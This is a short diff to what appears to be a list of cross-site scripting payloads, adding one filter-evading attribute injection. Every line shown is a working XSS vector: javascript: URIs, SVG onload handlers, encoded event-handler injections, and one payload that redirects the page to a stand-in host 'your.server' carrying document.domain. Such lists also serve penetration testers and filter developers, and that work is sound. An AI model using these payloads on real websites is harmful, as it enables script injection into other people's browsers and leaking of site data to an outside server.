@@ -17,3 +17,4 @@ javascript:{ alert`0` }
 <svg/onload=location/**/='https://your.server/'+document.domain>
 <svg onx=() onload=window.alert?.()>
 test",prompt%0A/*HelloWorld*/(document.domain)
+"onx+%00+onpointerenter%3dalert(domain)+x"
